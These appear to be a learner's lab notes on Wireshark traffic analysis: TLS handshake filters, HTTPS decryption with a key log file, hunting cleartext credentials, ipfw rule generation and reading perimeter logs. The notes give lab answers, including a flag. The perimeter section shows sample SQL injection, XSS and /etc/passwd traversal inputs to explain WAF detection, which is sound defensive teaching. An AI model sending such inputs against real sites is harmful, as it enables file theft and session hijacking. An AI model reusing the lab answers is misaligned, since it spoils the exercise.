- Downloaded files
- HTTP headers

---


# Why is HTTPS Important?


Although HTTPS protects legitimate users, attackers also use HTTPS because:

- Firewalls usually allow HTTPS traffic.
- Malware communicates over HTTPS.
- Data exfiltration is hidden inside encrypted traffic.
- Command & Control (C2) traffic often uses HTTPS.

Therefore, analysts must know **how to inspect TLS handshakes** and **decrypt HTTPS traffic** when key files are available.


---


# What Can You See Without Decryption?


Without the TLS keys, Wireshark can only show:

- Source IP
- Destination IP
- Ports
- TLS Handshake
- Certificates
- Server Name Indication (SNI)

You **cannot** see:

- HTTP Requests
- HTTP Responses
- URLs
- Cookies
- POST data
- Downloaded files

Example:


```plain text
Client
      │
TLS Encrypted Data
      │
Server
```


The packet payload appears as encrypted bytes.


---


# TLS Handshake


Before encrypted communication begins, the client and server perform a **TLS Handshake**.


This is similar to TCP's three-way handshake.


```plain text
Client
      │
Client Hello
      │
Server
      │
Server Hello
      │
Certificate Exchange
      │
Encryption Keys Created
      │
Encrypted HTTPS Communication
```


Only after the handshake are all packets encrypted.


---


# Useful HTTPS Filters


## Show HTTP Requests


```plain text
http.request
```


### Understanding the Filter


| Part           | Meaning                        |
| -------------- | ------------------------------ |
| `http.request` | Displays HTTP request packets. |


### Why use it?


If the traffic is already decrypted, this shows all HTTP requests.


If nothing appears, the traffic is probably encrypted.


---


## Show All TLS Traffic


```plain text
tls
```


### Understanding the Filter


| Part  | Meaning                   |
| ----- | ------------------------- |
| `tls` | Displays all TLS packets. |


### Why use it?


Use this filter to investigate encrypted HTTPS sessions.


You'll see:

- Client Hello
- Server Hello
- Certificates
- Key Exchange
- Encrypted Application Data

---


# TLS Handshake Filters


## Client Hello


```plain text
tls.handshake.type == 1
```


### Understanding the Filter


| Part                 | Meaning                     |
| -------------------- | --------------------------- |
| `tls.handshake.type` | TLS handshake message type. |
| `1`                  | Client Hello message.       |


### Why use it?


Every HTTPS connection **starts** with a Client Hello.


The Client Hello tells the server:

- Supported TLS versions
- Cipher suites
- Extensions
- Server Name (SNI)

Example:


```plain text
Browser

↓

Client Hello

↓

google.com
```


Useful for identifying **which server the client is trying to reach** before encryption begins.


---


## Server Hello


```plain text
tls.handshake.type == 2
```


### Understanding the Filter


| Part                 | Meaning                     |
| -------------------- | --------------------------- |
| `tls.handshake.type` | TLS handshake message type. |
| `2`                  | Server Hello message.       |


### Why use it?


The server responds with:

- Selected TLS version
- Cipher suite
- Session information

This confirms the encrypted session is being established.


---


## Ignore SSDP Traffic


```plain text
ssdp
```


### What is SSDP?


**Simple Service Discovery Protocol (SSDP)** is used by devices on the local network to discover services.


Examples:

- Smart TVs
- Printers
- Chromecast

It is **not related to HTTPS**.


Sometimes SSDP packets appear in captures and create unnecessary noise.


---


## Find Client Hello Packets


```plain text
(http.request or tls.handshake.type == 1) and !(ssdp)
```


### Understanding the Filter


| Part                      | Meaning                            |
| ------------------------- | ---------------------------------- |
| `http.request`            | Show HTTP requests (if decrypted). |
| `or`                      | Either condition can match.        |
| `tls.handshake.type == 1` | Show Client Hello packets.         |
| `!(ssdp)`                 | Exclude SSDP packets.              |


### Why use it?


This filter helps identify:

- Clients initiating HTTPS sessions
- HTTP requests (if traffic is decrypted)

while ignoring SSDP traffic.


---


## Find Server Hello Packets


```plain text
(http.request or tls.handshake.type == 2) and !(ssdp)
```


### Understanding the Filter


| Part                      | Meaning                       |
| ------------------------- | ----------------------------- |
| `http.request`            | HTTP requests (if decrypted). |
| `tls.handshake.type == 2` | Server Hello packets.         |
| `!(ssdp)`                 | Ignore SSDP traffic.          |


### Why use it?


Useful for identifying servers responding to TLS connections.


---


# TLS Key Log File


## Why Can't Wireshark Read HTTPS?


HTTPS packets are encrypted.


Example:


```plain text
HTTP

↓

Readable Text
```


HTTPS:


```plain text
Encrypted Bytes
```


Wireshark needs the **TLS session keys** to decrypt the packets.


---


## What is SSLKEYLOGFILE?


Browsers like:

- Chrome
- Firefox

can save TLS session keys into a file called:


```plain text
SSLKEYLOGFILE
```


Example:


```plain text
KeysLogFile.txt
```


This file contains the encryption keys generated during the TLS handshake.


Without this file,


Wireshark **cannot decrypt HTTPS traffic**.


---


## Adding the Key Log File


Open:


```plain text
Edit

↓

Preferences

↓

Protocols

↓

TLS

↓

(Pre)-Master-Secret log filename

↓

Browse

↓

KeysLogFile.txt
```


Wireshark automatically reloads the capture.


Encrypted packets now appear as:

- HTTP
- HTTP2
- Headers
- URLs
- Cookies
- Payloads

---


# What Changes After Decryption?


Before:


```plain text
TLS Application Data
```


After:


```plain text
HTTP GET

HTTP POST

Cookies

Headers

Downloaded Files
```


Additional packet layers become visible:

- Decrypted TLS
- HTTP2
- Reassembled TCP
- Reassembled SSL
- Decompressed Headers

---


# Practice Questions


## Question 1


**What is the frame number of the Client Hello sent to** [**accounts.google.com**](http://accounts.google.com/)**?**


**Answer:** `16`


---


### Filter


```plain text
tls.handshake.type == 1 and tls.handshake.extensions_server_name == "accounts.google.com"
```


### Understanding the Filter


| Part                                   | Meaning                                              |
| -------------------------------------- | ---------------------------------------------------- |
| `tls.handshake.type == 1`              | Show Client Hello packets only.                      |
| `and`                                  | Both conditions must be true.                        |
| `tls.handshake.extensions_server_name` | The Server Name Indication (SNI) sent by the client. |
| `"accounts.google.com"`                | Show connections requesting this domain.             |


### Why does it work?


Even though HTTPS is encrypted,


the **Server Name Indication (SNI)** is sent during the TLS handshake **before encryption**.


This tells the server which website the client wants to visit.


After applying the filter,


only one packet remains.


Frame Number:


```plain text
16
```


---


## Question 2


**Decrypt the traffic. How many HTTP2 packets are there?**


**Answer:** `115`


---


### Step 1


Load:


```plain text
KeysLogFile.txt
```


using:


```plain text
Edit

↓

Preferences

↓

Protocols

↓

TLS
```


---


### Step 2


Apply:


```plain text
http2
```


### Understanding the Filter


| Part    | Meaning                                                      |
| ------- | ------------------------------------------------------------ |
| `http2` | Displays HTTP Version 2 packets after successful decryption. |


### Why does it work?


Before loading the key log,


Wireshark only sees encrypted TLS packets.


After loading the keys,


those encrypted packets become readable HTTP2 packets.


Look at:


```plain text
Displayed:
```


Bottom-right corner:


```plain text
115
```


---


## Question 3


**Go to Frame 322. What is the :authority header?**


**Answer:**


```plain text
safebrowsing[.]googleapis[.]com
```


---


### Filter


```plain text
frame.number == 322
```


### Understanding the Filter


| Part           | Meaning                                    |
| -------------- | ------------------------------------------ |
| `frame.number` | Jump directly to a specific packet number. |
| `322`          | Opens packet 322.                          |


### How to Find the Answer


Open:


```plain text
Packet Details

↓

Hypertext Transfer Protocol Version 2

↓

Headers
```


Locate:


```plain text
:authority
```


Value:


```plain text
safebrowsing.googleapis.com
```


Defanged:


```plain text
safebrowsing[.]googleapis[.]com
```


---


## Question 4


**Investigate the decrypted packets and find the flag.**


**Answer:**


```plain text
FLAG{THM-PACKETMASTER}
```


---


### Method 1 (Recommended)


Open:


```plain text
File

↓

Export Objects

↓

HTTP
```


### Why?


After decryption,


Wireshark reconstructs downloaded HTTP objects.


You can inspect:

- Images
- HTML pages
- Documents
- Text files

Look for any unusual text file or downloaded object.


Opening it reveals:


```plain text
FLAG{THM-PACKETMASTER}
```


---


### Method 2


Search packet contents:


```plain text
frame contains "FLAG{"
```


### Understanding the Filter


| Part       | Meaning                     |
| ---------- | --------------------------- |
| `frame`    | Search the entire packet.   |
| `contains` | Look for specific text.     |
| `"FLAG{"`  | Search for the flag string. |


### Why does it work?


Once HTTPS is decrypted,


the flag becomes plain text inside the packet payload.


Searching for `"FLAG{"` immediately locates the packet containing the flag.


---


# Investigation Workflow


When analyzing HTTPS traffic:

1. Determine if the traffic is encrypted.

```plain text
tls
```


↓

1. Identify Client Hello packets.

```plain text
tls.handshake.type == 1
```


↓

1. Identify the destination using SNI.

```plain text
tls.handshake.extensions_server_name
```


↓

1. Load the TLS Key Log File.

↓

1. Apply:

```plain text
http
```


or


```plain text
http2
```


↓

1. Investigate:
- URLs
- Headers
- Cookies
- Files
- Payloads

↓

1. Export HTTP Objects if needed.

---


# Quick Summary


| Filter                                                  | Purpose                                        |
| ------------------------------------------------------- | ---------------------------------------------- |
| `tls`                                                   | Show all TLS traffic                           |
| `tls.handshake.type == 1`                               | Client Hello packets                           |
| `tls.handshake.type == 2`                               | Server Hello packets                           |
| `http.request`                                          | Show HTTP requests after decryption            |
| `http2`                                                 | Show HTTP/2 packets after decryption           |
| `(http.request or tls.handshake.type == 1) and !(ssdp)` | Find Client Hello packets while excluding SSDP |
| `(http.request or tls.handshake.type == 2) and !(ssdp)` | Find Server Hello packets while excluding SSDP |
| `frame.number == 322`                                   | Jump to a specific packet                      |
| `frame contains "FLAG{"`                                | Find the flag in decrypted traffic             |


# Bonus: Hunting Cleartext Credentials


## What are Cleartext Credentials?


**Cleartext credentials** are usernames and passwords transmitted **without encryption**.


Anyone capturing the network traffic can directly read them.


Example:


```plain text
Client

↓

Username: admin

Password: admin123

↓

Server
```


Unlike HTTPS, these credentials are **not encrypted**, making them easy for attackers to steal through packet sniffing.


---


# Why is Credential Hunting Important?


One of the first goals during a network investigation is determining whether sensitive credentials were exposed.


Finding cleartext credentials can help identify:

- Stolen usernames and passwords
- Weak authentication methods
- Brute-force attacks
- Misconfigured applications
- Legacy insecure protocols

---


# Protocols that Commonly Expose Credentials


Some older protocols send credentials in plain text.


Examples include:


| Protocol                  | Credentials Encrypted? |
| ------------------------- | ---------------------- |
| FTP                       | ❌ No                   |
| HTTP Basic Authentication | ❌ No                   |
| POP3                      | ❌ No                   |
| IMAP (without TLS)        | ❌ No                   |
| SMTP (without TLS)        | ❌ No                   |
| HTTPS                     | ✅ Yes                  |
| SSH                       | ✅ Yes                  |


---


# Wireshark Credentials Feature


Starting from **Wireshark 3.1**, Wireshark can automatically detect cleartext credentials for several supported protocols.


Supported protocols include:

- HTTP Basic Authentication
- FTP
- SMTP
- POP
- IMAP

Open:


```plain text
Tools

↓

Credentials
```


Wireshark displays a table containing:

- Packet Number
- Protocol
- Username
- Password (if available)
- Related Packet Numbers

This feature saves analysts from manually searching thousands of packets.

> **Important:** This feature only works for supported protocols. Always verify the packets manually instead of relying solely on the Credentials window.

---


# Manual Credential Hunting


Even if Wireshark does not detect credentials automatically, you can still investigate manually using display filters.


For example:

- FTP commands
- HTTP Authorization headers
- SMTP AUTH commands
- POP3 USER/PASS commands

Manual verification is an important investigation skill.


---


# HTTP Basic Authentication


## What is HTTP Basic Authentication?


HTTP Basic Authentication is one of the simplest web authentication mechanisms.


Instead of showing a custom login page, the browser displays a login popup.


Example:


```plain text
Username:

Password:
```


After the user enters the credentials, the browser sends:


```plain text
Authorization: Basic QWRtaW46cGFzc3dvcmQ=
```


Notice:


The username and password are **Base64 encoded**, **not encrypted**.


Anyone can decode Base64 easily.


Example:


```plain text
admin:password123
```


↓


Base64


↓


```plain text
YWRtaW46cGFzc3dvcmQxMjM=
```


This provides **no security** against packet sniffing.


---


# Useful Filters


## Find HTTP Basic Authentication


```plain text
http.authrequest
```


### Understanding the Filter


| Part               | Meaning                                                                                |
| ------------------ | -------------------------------------------------------------------------------------- |
| `http.authrequest` | Displays HTTP packets containing authentication requests or authorization information. |


### Why use it?


This filter quickly identifies HTTP authentication traffic.


Instead of searching every HTTP packet manually,


Wireshark isolates packets involved in authentication.


After selecting a packet, expand:


```plain text
Hypertext Transfer Protocol

↓

Credentials
```


Wireshark often displays:

- Username
- Password

already decoded.


---


# FTP Password Hunting


FTP sends passwords using the **PASS** command.


Example:


```plain text
USER admin

PASS password123
```


Since FTP is unencrypted,


the password is directly visible.


---


## Show All FTP Password Commands


```plain text
ftp.request.command == "PASS"
```


### Understanding the Filter


| Part                  | Meaning                                 |
| --------------------- | --------------------------------------- |
| `ftp.request.command` | FTP command sent by the client.         |
| `"PASS"`              | Show password submission commands only. |


### Why use it?


This immediately lists every password entered during FTP authentication.


You can quickly inspect:

- Successful logins
- Failed logins
- Empty passwords
- Repeated password attempts

---


## Find Empty Passwords


```plain text
ftp.request.command == "PASS" and ftp.request.arg == ""
```


### Understanding the Filter


| Part                            | Meaning                                        |
| ------------------------------- | ---------------------------------------------- |
| `ftp.request.command == "PASS"` | Show password commands only.                   |
| `and`                           | Both conditions must be true.                  |
| `ftp.request.arg`               | The password value sent with the PASS command. |
| `""`                            | Empty string (no password entered).            |


### Why does it work?


Normally:


```plain text
PASS secret123
```


contains:


```plain text
secret123
```


An empty password looks like:


```plain text
PASS
```


There is **nothing after the command**.


This usually means:

- The user accidentally pressed Enter.
- A script submitted an empty password.
- A login attempt failed due to missing input.

---


# Practice Questions


## Question 1


**What is the packet number of the credentials using HTTP Basic Authentication?**


**Answer:** `237`


---


### Method 1 (Recommended)


Open:


```plain text
Tools

↓

Credentials
```


Look for:


```plain text
HTTP Basic Authentication
```


Clicking the packet number automatically jumps to the corresponding packet.


Packet Number:


```plain text
237
```


---


### Method 2 (Display Filter)


```plain text
http.authrequest
```


### Understanding the Filter


| Part               | Meaning                                                      |
| ------------------ | ------------------------------------------------------------ |
| `http.authrequest` | Displays HTTP packets containing authentication information. |


### Why does it work?


HTTP Basic Authentication includes an **Authorization** header.


Applying the filter isolates those packets immediately.


After selecting the packet,


expand:


```plain text
Hypertext Transfer Protocol

↓

Credentials
```


Wireshark often shows:

- Username
- Password

without needing an external decoder.


Frame Number:


```plain text
237
```


---


## Question 2


**What is the packet number where an empty password was submitted?**


**Answer:** `170`


---


### Method 1 (Recommended)


```plain text
ftp.request.command == "PASS" and ftp.request.arg == ""
```


### Understanding the Filter


| Part                            | Meaning                      |
| ------------------------------- | ---------------------------- |
| `ftp.request.command == "PASS"` | Show FTP password commands.  |
| `ftp.request.arg == ""`         | The password field is empty. |


### Why does it work?


The PASS command should normally contain a password.


Example:


```plain text
PASS secret123
```


An empty password appears as:


```plain text
PASS
```


with no argument after it.


Applying the filter leaves only packets where the password field is blank.


Frame Number:


```plain text
170
```


---


### Method 2


Apply:


```plain text
ftp.request.command == "PASS"
```


Review each PASS command manually.


Look for the packet where:


```plain text
PASS
```


has no password beside it.


Packet Number:


```plain text
170
```


---


# Investigation Workflow


When hunting cleartext credentials:


### Step 1


Determine whether the protocol sends credentials in plain text.


Examples:

- FTP
- HTTP Basic Authentication
- POP3
- SMTP
- IMAP

↓


### Step 2


Open:


```plain text
Tools

↓

Credentials
```


Review any automatically detected usernames and passwords.


↓


### Step 3


If nothing is detected,


search manually using protocol-specific filters.


Examples:


```plain text
http.authrequest
```


```plain text
ftp.request.command == "PASS"
```


↓


### Step 4


Inspect the packets.


Verify:

- Username
- Password
- Login success/failure
- Source IP
- Destination IP

↓


### Step 5


Determine whether the credentials belong to:

- A legitimate user
- A failed login
- A brute-force attempt
- An attacker

---


# Quick Summary


| Filter                                                    | Purpose                                        |
| --------------------------------------------------------- | ---------------------------------------------- |
| `http.authrequest`                                        | Show HTTP Basic Authentication packets         |
| `ftp.request.command == "PASS"`                           | Show all FTP password submissions              |
| `ftp.request.command == "PASS" and ftp.request.arg == ""` | Find FTP login attempts with an empty password |


# Bonus: Generating Firewall Rules


## Why Generate Firewall Rules?


During a network investigation, identifying malicious traffic is only the first step.


After confirming suspicious activity, analysts often need to **block or allow specific traffic** to protect the network.


Instead of manually writing firewall rules, Wireshark can automatically generate them based on the selected packet.


This saves time and reduces syntax errors.


---


# What are Firewall ACL Rules?


An **ACL (Access Control List)** is a set of firewall rules that determines whether network traffic should be:

- Allowed (Permit)
- Blocked (Deny)

These rules can be based on:

- Source IP Address
- Destination IP Address
- Source Port
- Destination Port
- MAC Address
- Protocol

Example:


```plain text
Internet
      │
Malicious IP
      │
Firewall
      │
❌ Block
      ▼
Internal Network
```


---


# Wireshark Firewall ACL Generator


Wireshark includes a built-in tool that automatically converts packet information into firewall rules.


Open:


```plain text
Tools

↓

Firewall ACL Rules
```


After selecting a packet, Wireshark can generate rules using information from that packet.


For example:

- Source IP
- Destination IP
- Source Port
- Destination Port
- Source MAC
- Destination MAC

---


# Supported Firewall Platforms


Wireshark can generate rules for several firewall products, including:


| Firewall                 | Description                 |
| ------------------------ | --------------------------- |
| Netfilter (iptables)     | Linux firewall              |
| Cisco IOS                | Cisco routers and firewalls |
| IPFilter (ipfilter)      | Unix firewall               |
| IPFirewall (ipfw)        | FreeBSD firewall            |
| Packet Filter (pf)       | OpenBSD/macOS firewall      |
| Windows Firewall (netsh) | Windows firewall            |


This allows analysts to quickly copy generated rules into production firewalls.

> **Note:** The generated rules are intended for implementation on an **outside firewall interface**, where they block or permit traffic before it reaches the internal network.

---


# Understanding Firewall Rule Actions


## Deny Rule


A **deny** rule blocks matching traffic.


Example:


```plain text
Block all traffic from:

10.10.10.13
```


Result:


```plain text
Attacker

↓

Firewall

↓

❌ Blocked
```


---


## Allow Rule


An **allow** rule explicitly permits matching traffic.


Example:


```plain text
Allow traffic from:

00:d0:59:aa:af:80
```


Result:


```plain text
Trusted Device

↓

Firewall

↓

✅ Allowed
```


---


# IP Address-Based Rules


These rules filter traffic using IP addresses.


Example:


```plain text
Block:

10.10.10.13
```


Regardless of:

- Port
- Protocol
- Application

all traffic from that IP is denied.


---


## MAC Address-Based Rules


Sometimes filtering by IP is not sufficient.


Instead, you may allow or block a specific **network interface** using its MAC address.


Example:


```plain text
00:d0:59:aa:af:80
```


Only that physical device matches the rule.


---


## Practice Questions


## Question 1


**Select packet 99. Generate an IPFirewall (ipfw) rule to deny the source IPv4 address.**


**Answer**


```plain text
add deny ip from 10.10.10.13 to any in
```


---


### Step 1


Jump directly to:


```plain text
Frame 99
```


using:


```plain text
Ctrl + G
```


or


```plain text
frame.number == 99
```


---


### Understanding the Filter


| Part           | Meaning                  |
| -------------- | ------------------------ |
| `frame.number` | Opens a specific packet. |
| `99`           | Select packet 99.        |


---


### Step 2


Open:


```plain text
Tools

↓

Firewall ACL Rules
```


---


### Step 3


Choose:


```plain text
Product

↓

IPFirewall (ipfw)
```


---


### Step 4


Select:


```plain text
Source IPv4 Address
```


Action:


```plain text
Deny
```


---


### Generated Rule


```plain text
add deny ip from 10.10.10.13 to any in
```


---


### Understanding the Rule


| Part               | Meaning                                 |
| ------------------ | --------------------------------------- |
| `add`              | Add a new firewall rule.                |
| `deny`             | Block matching traffic.                 |
| `ip`               | Applies to IP traffic.                  |
| `from 10.10.10.13` | Match packets originating from this IP. |
| `to any`           | Block traffic to any destination.       |
| `in`               | Apply to incoming traffic.              |


### What Does This Rule Do?


Every incoming packet whose **source IP** is:


```plain text
10.10.10.13
```


will be blocked before entering the network.


---


## Question 2


**Select packet 231. Generate an IPFirewall (ipfw) rule to allow the destination MAC address.**


**Answer**


```plain text
add allow MAC 00:d0:59:aa:af:80 any in
```


---


### Step 1


Jump to:


```plain text
Frame 231
```


using:


```plain text
frame.number == 231
```


---


### Step 2


Open:


```plain text
Tools

↓

Firewall ACL Rules
```


---


### Step 3


Choose:


```plain text
Product

↓

IPFirewall (ipfw)
```


---


### Step 4


Select:


```plain text
Destination MAC Address
```


Action:


```plain text
Allow
```


---


### Generated Rule


```plain text
add allow MAC 00:d0:59:aa:af:80 any in
```


---


### Understanding the Rule


| Part                | Meaning                                             |
| ------------------- | --------------------------------------------------- |
| `add`               | Create a firewall rule.                             |
| `allow`             | Permit matching traffic.                            |
| `MAC`               | Match using a MAC address instead of an IP address. |
| `00:d0:59:aa:af:80` | Destination MAC address to allow.                   |
| `any`               | Allow from any source.                              |
| `in`                | Apply to incoming traffic.                          |


### What Does This Rule Do?


The firewall allows incoming traffic destined for the device whose MAC address is:


```plain text
00:d0:59:aa:af:80
```


regardless of the source.


---


## Investigation Workflow


When converting packet analysis into actionable firewall rules:


### Step 1


Identify the malicious or trusted packet.


↓


### Step 2


Select the packet in Wireshark.


↓


### Step 3


Open:


```plain text
Tools

↓

Firewall ACL Rules
```


↓


### Step 4


Choose the appropriate firewall platform.


Examples:

- Netfilter (iptables)
- Cisco IOS
- IPFirewall (ipfw)
- Packet Filter (pf)
- Windows Firewall

↓


### Step 5


Choose the matching criteria:

- Source IP
- Destination IP
- Source Port
- Destination Port
- Source MAC
- Destination MAC

↓


### Step 6


Choose the action:

- Allow
- Deny

↓


### Step 7


Review the generated rule before deploying it to production.


---


## Best Practices

- **Verify before deploying:** Automatically generated rules are based on a single packet. Confirm the traffic is truly malicious (or trusted) before applying the rule.
- **Choose the right match criteria:** Blocking an entire source IP may affect legitimate users. In some cases, filtering by a specific port or MAC address is more appropriate.
- **Understand the firewall syntax:** Although Wireshark generates valid rules, different firewall platforms have different capabilities and rule evaluation orders.

---


## Quick Summary


| Action                                   | Purpose                                                     |
| ---------------------------------------- | ----------------------------------------------------------- |
| `Tools → Firewall ACL Rules`             | Generate firewall rules from the selected packet            |
| `frame.number == 99`                     | Jump to packet 99                                           |
| `frame.number == 231`                    | Jump to packet 231                                          |
| `add deny ip from 10.10.10.13 to any in` | Block all incoming IP traffic from source `10.10.10.13`     |
| `add allow MAC 00:d0:59:aa:af:80 any in` | Allow incoming traffic destined for MAC `00:d0:59:aa:af:80` |


# Network Perimeter Monitoring & Protection


## What is Network Perimeter Monitoring?


The **network perimeter** is the boundary between an organization's **internal network** and the **Internet**.


Security devices such as:

- Firewalls
- IDS/IPS
- Web Application Firewalls (WAF)
- VPN Gateways

monitor this boundary to detect and stop attacks before they reach internal systems.


---


## Why Monitor the Perimeter?


Monitoring helps security analysts:

- Detect port scans
- Detect brute-force attacks
- Detect malware communication
- Detect data exfiltration
- Find exposed services
- Identify firewall misconfigurations

---


# Scenario 1: Port Scanning


## What is a Port Scan?


Before attacking a system, attackers first discover **which ports are open**.


Example:


```plain text
Attacker

↓

Port 21 (FTP)

↓

Blocked

↓

Port 22 (SSH)

↓

Blocked

↓

Port 23 (Telnet)

↓

Blocked

↓

Port 80 (HTTP)

↓

Open
```


Now the attacker knows **HTTP is available** and may attack the web server.


---


### Example Firewall Log


```plain text
BLOCK TCP 203.0.113.10 → 10.0.0.20:21

BLOCK TCP 203.0.113.10 → 10.0.0.20:22

BLOCK TCP 203.0.113.10 → 10.0.0.20:23

BLOCK TCP 203.0.113.10 → 10.0.0.20:25

BLOCK TCP 203.0.113.10 → 10.0.0.20:53
```


---


### How to Identify It


Notice:

- Same **Source IP**
- Same **Destination IP**
- Different destination ports
- Very short time interval

Pattern:


```plain text
One Source

↓

Many Ports

↓

Port Scan
```


---


### Analyst Verdict


The attacker is trying to discover which services are running before launching an attack.


---


# Scenario 2: Web Application Attacks


Unlike a firewall, a **Web Application Firewall (WAF)** understands HTTP requests and identifies the exact attack.


Example attacks include:

- SQL Injection
- Cross-Site Scripting (XSS)
- Directory Traversal

---


## SQL Injection


Attacker tries to manipulate database queries.


Example:


```plain text
/products.php?id=1 OR 1=1
```


Goal:


Read or dump database information.


---


## Cross Site Scripting (XSS)


Attacker injects JavaScript into a webpage.


Example:


```html
<script>alert('XSS')</script>
```


Goal:


Steal cookies or execute scripts in a victim's browser.


---


## Directory Traversal


Attacker tries to access files outside the web directory.


Example:


```plain text
../../../../etc/passwd
```


Goal:


Read sensitive system files.


---


### Example WAF Log


```plain text
action=BLOCK

attack_type="XSS"
```


```plain text
action=BLOCK

attack_type="Directory Traversal"
```


---


### Why is WAF Better than a Firewall?


A firewall only knows:


```plain text
Connection Allowed

or

Connection Blocked
```


A WAF knows:

- What page was requested
- What payload was sent
- Which attack technique was used

Example:


```plain text
attack_type="SQL Injection"
```


This immediately tells the analyst what happened.


---


### Analyst Verdict


The website is under active attack.


The WAF successfully blocked the malicious requests.


---


# Scenario 3: VPN Brute Force Attack


## What is a Brute Force Attack?


Instead of exploiting software,


the attacker repeatedly guesses usernames and passwords.


Example:


```plain text
admin : admin

admin : password

admin : 123456

admin : welcome

...
```


Eventually one password may work.


---


### Example VPN Log


```plain text
FAILED_AUTH

FAILED_AUTH

FAILED_AUTH

FAILED_AUTH

SUCCESS_AUTH
```


---


### How to Identify It


Normal users:


```plain text
1-2 Failed Login Attempts
```


Attackers:


```plain text
100+

Failed Logins

within a few minutes
```


Pattern:


```plain text
One Source

↓

One Destination

↓

Many Login Attempts

↓

Brute Force Attack
```


---


### Analyst Verdict


One external IP repeatedly attempted to log into the VPN using common usernames such as:

- admin
- guest
- root
- user

This indicates a brute-force attack.


---


# Recognizing Common Attack Patterns


## Port Scan


Pattern:


```plain text
One Source

↓

Many Destination Ports
```


Purpose:


Find open services.


---


## Brute Force


Pattern:


```plain text
One Source

↓

One Service

↓

Many Login Attempts
```


Purpose:


Guess passwords.


---


## Malware Beaconing


Pattern:


```plain text
One Host

↓

One Destination

↓

Regular Time Intervals
```


Example:


Every 30 minutes:


```plain text
10:00

10:30

11:00

11:30
```


Purpose:


Malware checking in with its Command & Control (C2) server.


---


# IDS vs Firewall


## Firewall


Can tell:


```plain text
Allowed

Blocked
```


Cannot explain **why**.


---


## IDS / IPS / WAF


Can tell:

- SQL Injection
- XSS
- Directory Traversal
- Malware
- Exploit Type

This provides much richer context for investigations.


---


# Investigation Workflow


### Step 1


Look for repeated events.


↓


### Step 2


Identify the source IP.


↓


### Step 3


Look for patterns.

- One IP → Many Ports → Port Scan
- One IP → One Service → Brute Force
- Regular Intervals → Beaconing

↓


### Step 4


Use IDS/WAF alerts to understand **what attack** is occurring.


↓


### Step 5


Determine whether the activity should be blocked or investigated further.


---


# Lab Questions


## Question 1


**Which IP is performing the port scan?**


**Answer**


```plain text
203.0.113.10
```


### Why?


The same source IP rapidly attempts connections to multiple ports on the same destination.


---


## Question 2


**Which IP is responsible for all blocked web attacks?**


**Answer**


```plain text
198.51.100.12
```


### Why?


Every `action=BLOCK` entry in the WAF logs originates from this IP.


---


## Question 3


**How many brute-force attempts failed?**


**Answer**


```plain text
90
```


### How to Find It


Count all:


```plain text
FAILED_AUTH
```


entries.


---


## Question 4


**Which IP attempted the VPN brute-force attack?**


### How to Find It

1. Open the VPN log.
2. Filter or search for:

```plain text
FAILED_AUTH
```

1. Group the results by **Source IP**.
2. Find the IP with the **highest number of failed logins** (about 90).

That IP is the attacker.

> Unlike normal users who may fail once or twice, the brute-force attacker generates dozens of `FAILED_AUTH` events in a very short time.
